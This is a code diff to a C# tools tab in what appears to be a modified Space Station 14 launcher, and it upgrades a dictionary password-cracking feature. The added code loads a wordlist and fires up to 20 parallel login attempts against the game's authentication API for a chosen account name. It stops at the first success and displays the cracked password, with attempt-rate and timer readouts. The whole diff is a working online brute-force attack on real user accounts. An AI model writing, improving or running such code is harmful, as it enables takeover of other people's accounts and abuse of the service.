@@ -32,6 +32,7 @@ using SS14.Launcher.ViewModels.Login;
 using TerraFX.Interop.WinRT;
 using static SS14.Launcher.ViewModels.Login.LoginViewModel;
 using ReactiveUI;
+using System.Threading;
 
 namespace SS14.Launcher.ViewModels.MainWindowTabs;
 
@@ -53,8 +54,46 @@ public class ToolsTabViewModel : MainWindowTabViewModel
     }
 
     private System.Timers.Timer? _ppsTimer;
-    private int _ppsCount;
-    private DateTime _ppsLastTime;
+    private readonly List<DateTime> _attemptTimestamps = new();
+    private DateTime _bruteStartTime;
+
+    private string _elapsedTime = "";
+    public string ElapsedTime
+    {
+        get => _elapsedTime;
+        set => this.RaiseAndSetIfChanged(ref _elapsedTime, value);
+    }
+
+    private int _dictLines;
+    public int DictLines
+    {
+        get => _dictLines;
+        set => this.RaiseAndSetIfChanged(ref _dictLines, value);
+    }
+
+    private bool _isRunning;
+    public bool IsRunning
+    {
+        get => _isRunning;
+        set => this.RaiseAndSetIfChanged(ref _isRunning, value);
+    }
+
+    public string StartStopButtonText => IsRunning ? "Stop" : "Start";
+
+    private CancellationTokenSource? _cancelSource;
+    public ICommand StartStopCommand => new RelayCommand(StartStop);
+
+    private void StartStop()
+    {
+        if (IsRunning)
+        {
+            _cancelSource?.Cancel();
+        }
+        else
+        {
+            OnStartButtonPressed();
+        }
+    }
 
     public ToolsTabViewModel(AuthApi authApi)
     {
@@ -71,57 +110,120 @@ public class ToolsTabViewModel : MainWindowTabViewModel
     {
         try
         {
+            IsRunning = true;
+            this.RaisePropertyChanged(nameof(StartStopButtonText));
             FoundPassword = "";
             PasswordsPerMinute = 0.0;
+            ElapsedTime = "";
+            _attemptTimestamps.Clear();
+            _bruteStartTime = DateTime.UtcNow;
+            _cancelSource = new CancellationTokenSource();
             StreamReader sr = new StreamReader(Path);
             var passwords = new List<string>();
             string? dict;
             while ((dict = await sr.ReadLineAsync()) != null)
                 passwords.Add(dict);
             sr.Close();
+            DictLines = passwords.Count;
             int count = 0;
-            _ppsCount = 0;
-            _ppsLastTime = DateTime.UtcNow;
-            var startTime = DateTime.UtcNow;
+            var startTime = _bruteStartTime;
             _ppsTimer?.Stop();
             _ppsTimer = new System.Timers.Timer(500);
             _ppsTimer.Elapsed += (s, e) =>
             {
                 var now = DateTime.UtcNow;
-                var elapsed = (now - _ppsLastTime).TotalSeconds;
-                if (elapsed > 0)
+                double elapsedSinceStart = (now - _bruteStartTime).TotalSeconds;
+                double window = Math.Min(10.0, elapsedSinceStart);
+                _attemptTimestamps.RemoveAll(ts => (now - ts).TotalSeconds > window);
+                var attempts = _attemptTimestamps.Count;
+                if (window > 0)
                 {
-                    var ppm = (_ppsCount / elapsed) * 60.0;
+                    var ppm = (attempts / window) * 60.0;
                     PasswordsPerMinute = ppm;
                 }
-                _ppsCount = 0;
-                _ppsLastTime = now;
+                else
+                {
+                    PasswordsPerMinute = 0.0;
+                }
+                ElapsedTime = $"Время: {(now - _bruteStartTime).ToString(@"hh\:mm\:ss")}";
             };
             _ppsTimer.AutoReset = true;
             _ppsTimer.Start();
+
+            int maxParallel = 20;
+            var semaphore = new SemaphoreSlim(maxParallel);
+            var tasks = new List<Task>();
+            bool found = false;
+            object foundLock = new object();
+            var token = _cancelSource.Token;
+
             foreach (var pwd in passwords)
             {
-                var request = new AuthApi.AuthenticateRequest(CKey, pwd);
-                var respTask = _authApi.AuthenticateAsync(request);
-                count++;
-                _ppsCount++;
-                var resp = await respTask;
-                if (resp.IsSuccess)
+                await semaphore.WaitAsync(token);
+                if (found || token.IsCancellationRequested) { semaphore.Release(); break; }
+                var localPwd = pwd;
+                var task = Task.Run(async () =>
                 {
-                    FoundPassword = pwd;
-                    break;
-                }
+                    try
+                    {
+                        if (token.IsCancellationRequested) return;
+                        var request = new AuthApi.AuthenticateRequest(CKey, localPwd);
+                        var resp = await _authApi.AuthenticateAsync(request);
+                        if (token.IsCancellationRequested) return;
+                        lock (_attemptTimestamps)
+                        {
+                            _attemptTimestamps.Add(DateTime.UtcNow);
+                        }
+                        Interlocked.Increment(ref count);
+                        if (resp.IsSuccess && !token.IsCancellationRequested)
+                        {
+                            lock (foundLock)
+                            {
+                                if (!found)
+                                {
+                                    found = true;
+                                    FoundPassword = localPwd;
+                                    _cancelSource?.Cancel();
+                                }
+                            }
+                        }
+                    }
+                    finally
+                    {
+                        semaphore.Release();
+                    }
+                }, token);
+                tasks.Add(task);
+                if (found || token.IsCancellationRequested) break;
             }
+            try
+            {
+                await Task.WhenAll(tasks);
+            }
+            catch (OperationCanceledException) { }
             _ppsTimer.Stop();
+            _attemptTimestamps.Clear();
             var totalElapsed = (DateTime.UtcNow - startTime).TotalSeconds;
             if (totalElapsed > 0)
                 PasswordsPerMinute = (count / totalElapsed) * 60.0;
             else
                 PasswordsPerMinute = 0.0;
+            ElapsedTime = $"Время: {(DateTime.UtcNow - startTime).ToString(@"hh\:mm\:ss")}";
         }
         catch (Exception e)
         {
             Log.Error(e, "Something went wrong");
+        }
+        finally
+        {
+            IsRunning = false;
+            this.RaisePropertyChanged(nameof(StartStopButtonText));
+            if (_ppsTimer != null)
+            {
+                _ppsTimer.Stop();
+                _ppsTimer.Dispose();
+                _ppsTimer = null;
+            }
         }
     }
 }
